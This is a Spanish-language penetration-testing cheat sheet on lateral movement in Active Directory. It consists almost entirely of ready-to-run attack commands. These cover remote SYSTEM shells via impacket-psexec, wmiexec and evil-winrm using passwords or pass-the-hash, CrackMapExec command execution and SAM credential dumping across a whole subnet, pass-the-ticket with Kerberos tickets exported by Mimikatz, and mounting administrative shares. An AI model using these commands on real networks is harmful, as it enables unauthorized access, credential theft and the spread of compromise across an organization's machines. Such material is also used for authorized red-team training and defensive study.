# Movimiento Lateral en Active Directory

Una vez con credenciales válidas, el objetivo es moverse por la red
hacia objetivos de mayor valor.

---

## Herramientas de ejecución remota

### impacket-psexec (shell SYSTEM via SMB)

```bash
# Con contraseña
impacket-psexec empresa.local/Administrador:'Password123!'@192.168.1.41

# Con hash (Pass-the-Hash)
impacket-psexec empresa.local/Administrador@192.168.1.41 \
    -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

### impacket-wmiexec (sin crear servicio — más silencioso)

```bash
impacket-wmiexec empresa.local/Administrador:'Password123!'@192.168.1.41

# Ejecutar comando específico
impacket-wmiexec empresa.local/Administrador:'Password123!'@192.168.1.41 \
    "whoami /all"
```

### evil-winrm (WinRM — puerto 5985)

```bash
# Con contraseña
evil-winrm -i 192.168.1.41 -u Administrador -p 'Password123!'

# Con hash
evil-winrm -i 192.168.1.41 -u Administrador -H "31d6cfe0..."

# Con archivo de hashes
evil-winrm -i 192.168.1.41 -u Administrador -H hash_file.txt
```

### CrackMapExec — Ejecutar comandos en múltiples hosts

```bash
# Verificar qué máquinas responden con las credenciales actuales
crackmapexec smb 192.168.1.0/24 -u Administrador -p 'Password123!'

# Ejecutar comando en todos los hosts donde funciona
crackmapexec smb 192.168.1.0/24 -u Administrador -p 'Password123!' \
    -x "whoami"

# Dump de SAM en todos los hosts alcanzables
crackmapexec smb 192.168.1.0/24 -u Administrador -p 'Password123!' \
    --sam
```

---

## Pass-the-Ticket (T1550.003)

Usar tickets Kerberos (.ccache) robados en lugar de contraseñas o hashes.

```bash
# Exportar un ticket desde Windows (con Mimikatz)
# sekurlsa::tickets /export

# Desde Kali — importar el ticket
export KRB5CCNAME=ticket.ccache

# Usar el ticket para autenticarse
impacket-psexec -k -no-pass empresa.local/juan.garcia@wkstn01.empresa.local
impacket-wmiexec -k -no-pass empresa.local/juan.garcia@wkstn01.empresa.local
```

---

## Mapeo de recursos compartidos

```bash
# Listar shares accesibles
crackmapexec smb 192.168.1.0/24 -u juan -p 'Pass123!' --shares

# Acceder a shares con smbclient
smbclient //192.168.1.41/C$ -U 'empresa.local/Administrador%Password123!'

# Montar un share en Kali
mount -t cifs //192.168.1.41/C$ /mnt/target \
    -o username=Administrador,password='Password123!',domain=empresa.local
```
